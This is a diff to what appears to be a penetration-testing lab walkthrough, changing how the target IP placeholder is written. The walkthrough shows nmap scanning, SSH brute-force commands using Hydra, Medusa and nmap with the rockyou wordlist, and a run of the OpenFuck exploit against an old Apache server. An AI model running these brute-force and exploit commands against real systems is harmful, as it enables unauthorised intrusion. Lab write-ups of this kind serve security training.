@@ -15,7 +15,7 @@
 
 ## Step 2: Port Scanning
 
-    command: nmap -A "<Target-IP>"
+    command: nmap -A Target-IP
 
 <img width="1263" height="697" alt="3 scan-result" src="https://github.com/user-attachments/assets/6c5474a0-6978-40f6-aafc-1ecbd973ee97" />
 
@@ -44,7 +44,7 @@
 
 ###  a) Using Nmap
 
-    Command: nmap "<Target-IP>" -p 22 --script ssh-brute-nse --script-args userdb= <username.txt>
+    Command: nmap Target-IP -p 22 --script ssh-brute-nse --script-args userdb= <username.txt>
     
 <img width="743" height="807" alt="7 SSH(Brute-Force-Nmap)" src="https://github.com/user-attachments/assets/3bf9b5ec-d474-45ef-b3a6-78452d665361" />
 
@@ -52,7 +52,7 @@ Result: Scan was very slow and No valid credentials found.
  
 ###  b) Using Hydra
 
-    Command: Hydra -L <username.txt> -P /usr/share/wordlists/rockyou.txt ssh://"<Target-IP>"
+    Command: Hydra -L <username.txt> -P /usr/share/wordlists/rockyou.txt ssh://Target-IP
     
 <img width="1582" height="217" alt="8 SSH(Brute-Force-Hydra)" src="https://github.com/user-attachments/assets/bd71e13b-3397-43a2-ae3b-594df60a22e3" />
 
@@ -60,7 +60,7 @@ Result: Encountered error related to encryption/authentication.
 
 ### c) Using Medusa
 
-    Command:medusa -h "<Target-IP>" -U <username.txt> -P /usr/share/wordlists/rockyou.txt -M ssh
+    Command:medusa -h Target-IP -U <username.txt> -P /usr/share/wordlists/rockyou.txt -M ssh
 <img width="1337" height="728" alt="9 SSH(Brute-Force-Medusa)" src="https://github.com/user-attachments/assets/1f65c432-bb21-4ae9-9c0c-e0657511e02e" />
 
 Result:No credentials found even after long period of time.
@@ -97,7 +97,7 @@ Find the version of the target machine ("In this case RedHat Linux") And the ver
 
 <img width="813" height="663" alt="13 (Apache-Version)" src="https://github.com/user-attachments/assets/cd2be0ee-8f86-4d32-9f52-d472b782408a" />
 
-    Run: ./OpenFuck 0x6b "<Target-IP>" -c 50
+    Run: ./OpenFuck 0x6b Target-IP -c 50
 
 
 
